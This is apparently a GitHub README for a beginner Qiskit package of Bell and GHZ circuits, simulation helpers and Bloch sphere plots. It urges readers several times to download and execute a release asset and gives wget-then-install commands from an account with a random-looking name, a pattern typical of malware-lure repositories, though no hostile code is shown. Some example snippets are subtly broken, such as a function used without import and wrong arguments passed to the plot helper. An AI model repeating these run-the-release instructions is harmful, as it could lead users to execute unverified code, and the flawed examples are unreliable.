# qiskit-utils-sj: Beginner Qiskit Tools for Quantum Prototyping ⚛️

[![Releases](https://img.shields.io/badge/Releases-Download-blue.svg)](https://github.com/dewqfgfggfg/qiskit-utils-sj/releases)

![Bloch sphere](https://upload.wikimedia.org/wikipedia/commons/3/37/Bloch_sphere.svg)

A beginner-friendly Qiskit utility package for quantum computing. It provides ready-to-use quantum circuits (Bell, GHZ), fast simulation tools, and Bloch sphere visualization to speed up quantum algorithm prototyping.

Badges
- [![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
- [![Qiskit](https://img.shields.io/badge/qiskit-0.40%2B-660099.svg)](https://qiskit.org/)
- [![Simulation](https://img.shields.io/badge/simulation-Aer-green.svg)](https://qiskit.org/documentation/apidoc/aer.html)
- [![Visualization](https://img.shields.io/badge/visualization-Bloch%20Sphere-orange.svg)](https://en.wikipedia.org/wiki/Bloch_sphere)
- [![Topics](https://img.shields.io/badge/topics-bloch--sphere%20%7C%20educational%20%7C%20python-blue.svg)](https://github.com/dewqfgfggfg/qiskit-utils-sj)
- [![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)](./LICENSE)

Table of contents
- Features
- Quick links
- Install
- Download & Releases
- Basic usage
  - Bell state example
  - GHZ state example
  - Statevector and counts
  - Bloch sphere visualization
- API overview
  - qiskit_utils_sj.circuits
  - qiskit_utils_sj.simulation
  - qiskit_utils_sj.visualize
  - qiskit_utils_sj.utils
- Examples and recipes
  - Entanglement demo
  - Noise and sampling
  - Swap test recipe
  - Parameterized circuits and gradients
- Integration with Qiskit
- Testing and CI
- Contributing
- Roadmap
- FAQ
- License

Features
- Ready-made circuits: Bell and GHZ circuits with clean API.
- Fast simulation helpers: statevector and sampling wrappers for Aer.
- Bloch sphere visualization: render single-qubit states on a Bloch sphere.
- Small, focused, and educational. Use it in tutorials, demos, and experiments.
- Works with standard Qiskit objects: QuantumCircuit, Aer simulators, and Terra backends.

Quick links
- Releases: https://github.com/dewqfgfggfg/qiskit-utils-sj/releases
- Repository topics: bloch-sphere, educational, python, qiskit, quan-circuits, quantum-algorithms, quantum-computing, quantum-visualization, research-tools, simulation

Install

Requirements
- Python 3.8 or newer.
- Qiskit 0.40 or newer (core Terra and Aer recommended).
- Matplotlib for plots.
- NumPy.

Pip install (from PyPI)
- If the package is published to PyPI, use:
```
pip install qiskit-utils-sj
```

Local install (from source)
- Clone the repo and install with pip:
```
git clone https://github.com/dewqfgfggfg/qiskit-utils-sj.git
cd qiskit-utils-sj
pip install -e .
```

Download & Releases

Download release assets from the Releases page on GitHub:
https://github.com/dewqfgfggfg/qiskit-utils-sj/releases

The release file on that page needs to be downloaded and executed. Typical release assets include wheels (.whl) or source bundles (.tar.gz). After you download the file, run pip on it. Example:
```
wget https://github.com/dewqfgfggfg/qiskit-utils-sj/releases/download/v1.0.0/qiskit_utils_sj-1.0.0-py3-none-any.whl
pip install qiskit_utils_sj-1.0.0-py3-none-any.whl
```
Or for a source archive:
```
wget https://github.com/dewqfgfggfg/qiskit-utils-sj/releases/download/v1.0.0/qiskit-utils-sj-1.0.0.tar.gz
tar -xzf qiskit-utils-sj-1.0.0.tar.gz
cd qiskit-utils-sj-1.0.0
pip install .
```
If that link does not work, check the Releases section on GitHub for the correct asset file and version.

Basic usage

Core idea
- Create prepared circuits with a single call.
- Run circuits on Aer simulators with helper functions.
- Visualize single-qubit states on a Bloch sphere.

Bell state example (create, run, and inspect)
```
from qiskit import Aer
from qiskit_utils_sj.circuits import bell
from qiskit_utils_sj.simulation import run_counts

# create a Bell circuit on 2 qubits
qc = bell()

# run on Aer qasm_simulator for sample counts
counts = run_counts(qc, backend='qasm_simulator', shots=2048)
print(counts)
# expected output: {'00': ~1024, '11': ~1024}
```

GHZ state example
```
from qiskit_utils_sj.circuits import ghz
from qiskit_utils_sj.simulation import run_statevector

qc = ghz(3)  # 3 qubits in GHZ
state = run_statevector(qc)
print(state)  # prints the statevector as a numpy array
```

Statevector and counts
- run_statevector(qc, backend='statevector_simulator') returns the statevector as a numpy array.
- run_counts(qc, backend='qasm_simulator', shots=1024) returns a dictionary of measurement counts.

Bloch sphere visualization
```
from qiskit_utils_sj.visualize import plot_bloch_statevector
from qiskit import Aer
from qiskit_utils_sj.circuits import bell
from qiskit_utils_sj.simulation import run_statevector

qc = bell()
sv = run_statevector(qc)
# plot the bloch statevector for qubit 0
plot_bloch_statevector(sv, qubit=0)
```
- The function wraps qiskit.visualization.plot_bloch_vector.
- It calculates the Bloch vector for a single-qubit reduced density matrix.

API overview

qiskit_utils_sj.circuits
- bell(num_qubits=2)
  - Returns a QuantumCircuit that prepares a Bell pair on the first two qubits.
  - The circuit applies H on qubit 0, then CX(0,1).
- ghz(n)
  - Returns a QuantumCircuit that prepares an n-qubit GHZ state.
  - The circuit applies H on qubit 0 and cascaded CX gates.

qiskit_utils_sj.simulation
- run_statevector(circuit, backend='statevector_simulator')
  - Runs the circuit on a statevector backend and returns a numpy array.
  - If a density matrix or noisy backend is requested, function adapts output.
- run_counts(circuit, backend='qasm_simulator', shots=1024)
  - Runs the circuit with measurement on all qubits and returns counts.
- sample_expectation(circuit, operator, backend='qasm_simulator', shots=8192)
  - Estimates expectation values from measurement results.

qiskit_utils_sj.visualize
- plot_bloch_statevector(statevector, qubit=0, ax=None)
  - Plots Bloch vector for a single qubit extracted from statevector.
- bloch_from_densitymatrix(density_matrix)
  - Converts a 2x2 density matrix into (x, y, z) coordinates.

qiskit_utils_sj.utils
- measure_all(circuit)
  - Appends measurement gates to all qubits and returns a new circuit.
- reduce_statevector(statevector, qubit)
  - Returns the reduced statevector for a single qubit.

Examples and recipes

Entanglement demo
- Goal: create and validate a Bell state and visualize single-qubit Bloch vectors.
- Steps:
  1. Create a Bell circuit.
  2. Run statevector simulation.
  3. Reduce to single qubit states.
  4. Plot Bloch vectors.

Code
```
from qiskit_utils_sj.circuits import bell
from qiskit_utils_sj.simulation import run_statevector
from qiskit_utils_sj.visualize import bloch_from_densitymatrix, plot_bloch_statevector

qc = bell()
sv = run_statevector(qc)
# get Bloch vector for qubit 0
bloch_vec = bloch_from_densitymatrix(reduce_density_matrix(sv, qubit=0))
plot_bloch_statevector(bloch_vec)
```
- The reduced density matrix shows a mixed state for individual qubits in entangled systems.
- The Bloch sphere image shows a point at the origin for a maximally mixed single qubit.

Noise and sampling
- Use Aer noise models or backend noise to test robustness.
- The package offers helpers to add noise channels to circuits and to run on noisy simulators.

Swap test recipe
- Use the standard swap test to compare two states.
- The package includes a swap_test helper that builds the circuit and returns the measurement counts.

Parameterized circuits and gradients
- Build parameterized quantum circuits with Qiskit’s Parameter objects.
- The package includes utilities to bind parameters and evaluate expectation values.

Integration with Qiskit

Use Qiskit objects directly. The package returns QuantumCircuit and numpy arrays. You can pass circuits to Qiskit backends and use standard Qiskit tools.

Examples
```
from qiskit import Aer, execute
from qiskit_utils_sj.circuits import ghz

qc = ghz(4)
backend = Aer.get_backend('qasm_simulator')
job = execute(qc, backend, shots=2048)
result = job.result()
print(result.get_counts())
```

Testing and CI

Unit tests
- tests/ contains tests for circuits, simulation, and visualization code.
- Run tests with pytest:
```
pip install -e .
pip install -r requirements-dev.txt
pytest -q
```

GitHub Actions
- Example workflow file .github/workflows/ci.yml
  - Runs tests on push and pull request.
  - Uses Python 3.8, 3.9, 3.10.
  - Installs Qiskit and test requirements.

Example CI snippet
```
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.8, 3.9, 3.10]
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}
      - run: pip install -r requirements-dev.txt
      - run: pytest -q
```

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Add tests for new features.
- Open a pull request with a clear description.

Code style
- Follow PEP8.
- Keep functions short.
- Add docstrings for public functions.

Issue template
- Provide a minimal reproducible example.
- Include platform, Python, Qiskit versions.

Design principles
- Keep the API small.
- Use Qiskit objects when possible.
- Favor readable code over micro-optimizations.

Roadmap

Planned features
- Additional prepared circuits: W states, cluster states.
- More visualization tools: multi-qubit Bloch projections.
- Remote backend helpers: wrappers for IBM and other cloud providers.
- Tutorials and step-by-step notebooks for learning quantum circuits.

Milestones
- v1.0: core circuits and simulation helpers (current).
- v1.1: noise helpers and swap test.
- v2.0: visualization upgrade and integration with Jupyter widgets.

FAQ

Q: What does this package do?
A: It provides small helpers to build and test basic quantum circuits. The package focuses on Bell and GHZ circuits, simulation wrappers, and Bloch sphere visualization.

Q: Do I need Qiskit already installed?
A: Yes. The package uses Qiskit Terra and Aer. Install Qiskit prior to use.

Q: How do I report a bug?
A: Open an issue on GitHub and include a minimal example that reproduces the behavior.

Q: Where do I get releases?
A: Visit the Releases page here: https://github.com/dewqfgfggfg/qiskit-utils-sj/releases. Download the release file from that page and execute it as needed. Typical commands use pip to install the wheel or source archive.

Gallery and images

Bloch sphere image
- Source: Wikimedia Commons
- Use the image to illustrate single-qubit states.

GHZ circuit image
- Generate with Qiskit:
```
from qiskit_utils_sj.circuits import ghz
from qiskit.visualization import circuit_drawer

qc = ghz(4)
qc_draw = circuit_drawer(qc, output='mpl')
qc_draw.savefig('ghz_example.png')
```

Bell circuit image
- Create a simple drawing to show the H and CX gates.

Tutorial notebooks
- /notebooks contains step-by-step guides:
  - bell_demo.ipynb
  - ghz_demo.ipynb
  - bloch_visuals.ipynb

Examples in detail

1) Bell state full demo with plots
```
import matplotlib.pyplot as plt
from qiskit_utils_sj.circuits import bell
from qiskit_utils_sj.simulation import run_statevector, run_counts
from qiskit_utils_sj.visualize import plot_bloch_statevector
from qiskit.visualization import plot_histogram

qc = bell()
sv = run_statevector(qc)
counts = run_counts(qc, shots=2048)

# histogram
plot_histogram(counts)
plt.show()

# bloch for qubit 0
plot_bloch_statevector(sv, qubit=0)
plt.show()
```
- The histogram shows two peaks.
- The Bloch plot for a maximally entangled subsystem sits at the origin.

2) GHZ parity measurement demo
```
from qiskit_utils_sj.circuits import ghz
from qiskit_utils_sj.simulation import run_counts

qc = ghz(3)
counts = run_counts(qc, shots=1024)
print("Counts:", counts)
```
- You should see counts mostly in '000' and '111'.

3) Basic noise test
```
from qiskit import Aer
from qiskit.providers.aer.noise import NoiseModel
from qiskit_utils_sj.circuits import bell
from qiskit_utils_sj.simulation import run_counts

qc = bell()
noise_model = NoiseModel()
# add a simple depolarizing channel (example)
# configure accordingly

counts = run_counts(qc, backend='qasm_simulator', shots=2048)
print(counts)
```

Code style and documentation

Docstrings
- Each public function includes a short description, arguments, and return types.
- Use examples in docstrings.

Sphinx
- The repo contains a docs/ folder for Sphinx.
- Use sphinx-autodoc to generate API docs.

Tests
- Tests focus on correctness and stability.
- Use small circuits for unit tests.

Security and privacy

- The package manipulates quantum circuits and local simulations only.
- It does not send data to external services by default.
- When you configure remote backends, follow the backend provider guidelines.

Versioning and releases

- Follow semantic versioning: MAJOR.MINOR.PATCH.
- Each release includes a changelog describing feature additions and fixes.
- Use GitHub Releases for binary assets.

Release link usage (again)
- Visit the Releases page to download the release file:
  https://github.com/dewqfgfggfg/qiskit-utils-sj/releases
- Download the asset for your platform and execute pip install on the file.

License

- MIT License. See LICENSE file in repository.

Maintenance and support

- The repo accepts issues and pull requests.
- Use the issue tracker for bug reports and feature requests.
- Include environment details and reproducible code in issues.

Advanced topics

Reduced density matrices
- The package includes helpers to compute single-qubit reduced density matrices.
- This is useful to determine subsystem purity and entanglement measures.

Purity and fidelity
- Utilities compute trace(rho^2) for purity.
- The package includes a simple fidelity helper between two statevectors.

Custom operators and measurements
- Use Qiskit’s Operator class and combine with the sampling helpers to estimate expectation values.

Performance notes
- For heavy simulation tasks, use Aer with statevector or density matrix backends.
- For sampling and noise, use qasm_simulator with appropriate noise models.

Educational use

Classroom workflows
- Use the package to show Bell tests and simple entanglement experiments.
- Implement in Jupyter notebooks for step-by-step learning.

Demo slides
- Include snapshots from notebooks for teaching material.

Contact and further reading

- For help, open an issue on GitHub.
- Look at Qiskit documentation for deeper API details.
- Explore quantum computing texts for theoretical background.

Appendix: common commands

Clone and install locally
```
git clone https://github.com/dewqfgfggfg/qiskit-utils-sj.git
cd qiskit-utils-sj
pip install -e .
```

Run tests
```
pytest -q
```

Install from release file (example)
```
wget https://github.com/dewqfgfggfg/qiskit-utils-sj/releases/download/v1.0.0/qiskit_utils_sj-1.0.0-py3-none-any.whl
pip install qiskit_utils_sj-1.0.0-py3-none-any.whl
```

Files and structure (suggested)
- qiskit_utils_sj/
  - __init__.py
  - circuits.py
  - simulation.py
  - visualize.py
  - utils.py
- tests/
  - test_circuits.py
  - test_simulation.py
- docs/
  - conf.py
  - index.rst
- notebooks/
  - bell_demo.ipynb
  - ghz_demo.ipynb

References and links
- Qiskit docs: https://qiskit.org/documentation
- Bloch sphere: https://en.wikipedia.org/wiki/Bloch_sphere
- Releases page: https://github.com/dewqfgfggfg/qiskit-utils-sj/releases

Community and contributors
- The project welcomes contributions that add tests and examples.
- Create a PR with a clear description and link to tests.

Assets and images used in this README
- Bloch sphere (Wikimedia): https://upload.wikimedia.org/wikipedia/commons/3/37/Bloch_sphere.svg
- Qiskit logo and docs: https://qiskit.org/

This README links to the Releases page twice and instructs that the release file needs to be downloaded and executed. Visit https://github.com/dewqfgfggfg/qiskit-utils-sj/releases to get the latest release asset and version.